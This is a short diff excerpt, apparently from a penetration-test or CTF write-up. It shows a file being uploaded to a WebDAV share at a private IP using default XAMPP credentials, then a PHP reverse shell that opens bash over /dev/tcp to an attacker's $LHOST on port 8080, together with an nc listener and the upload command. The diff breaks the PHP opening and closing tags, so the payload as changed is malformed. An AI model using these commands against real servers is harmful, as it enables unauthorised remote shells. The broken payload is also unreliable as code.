@@ -60,9 +60,9 @@ curl -u wampp:xampp -T service http://10.130.148.83/webdav/
 The file uploaded successfully — a PHP reverse shell can be planted.
 
 ```bash
-echo  '<?php
+echo  '<php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/8080 0>&1'");
-?>' >> reverse.php
+>' >> reverse.php
 nc -nlvp 8080
 curl -u wampp:xampp -T reverse.php http://10.130.148.83/webdav/
 ```
